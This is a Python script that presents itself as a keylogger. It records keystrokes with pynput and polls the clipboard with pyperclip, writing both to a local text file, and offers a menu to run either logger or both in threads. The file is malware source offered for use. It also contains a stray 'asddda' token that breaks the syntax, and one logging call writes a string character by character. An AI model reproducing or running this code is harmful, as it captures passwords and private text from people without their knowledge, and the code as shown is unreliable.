## every time the users hits space we want to create a new line
import pynput
from pynput.keyboard import Key, Listener
import threading
import time
import pyperclip

count = 0
keys = []
filename = "testo.txt"




def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        ##functions that are going to be called when a key is pressed
        listener.join()


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(filename , "a") as file:
        for key in keys:
            k = str(key).replace("'" , "")
            if k.find("space") > 0: ## if k is a space then add a newline
                file.write('\n')
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        write_file(keys)
        return False

##----------------------------------------------
def write_on_text(words , filename):
    with open(filename , "a") as file:
        for x in words:
            file.write(x+ " ")
    file.close()


def clip_keylogger():
    filename = 'testo.txt'
    words = []
    i = 0
    time_counter = 0
    while True:
        if pyperclip.paste() != 'None':
            value = pyperclip.paste()  ## u  copy the text from the clipboard

            if value not in words:
                words.append(value)
                i+=1

            print(words)

            time.sleep(2)
            time_counter += 1
            if time_counter > 15 :
                time_counter = 0
                write_on_text("Backup save ---> " + str(words) , filename)

        if i > 5:
            break
    write_on_text(words, filename)


print("1----> standard keylogger")
print("2----> clipboard keylogger")
print("3----> 1 and 2 at the same time" + "\n")
choice = int(input(""))


if choice == 1:
    print("Standard Keylogger running..." + "\n")
    thread_obj = threading.Thread(target=main)
    thread_obj.start()
elif choice == 2:
    print("Clipboard keylogger running..." + "\n")
    thread_obj2 = threading.Thread(target = clip_keylogger)
    thread_obj2.start()
elif choice == 3:
    print("Clipboard and standard keylogger running..." + "\n")
    thread_obj = threading.Thread(target=main)
    thread_obj.start()asddda
    thread_obj2 = threading.Thread(target = clip_keylogger)
    thread_obj2.start()
else:
    print("Error , re run the program and make a proper choice.")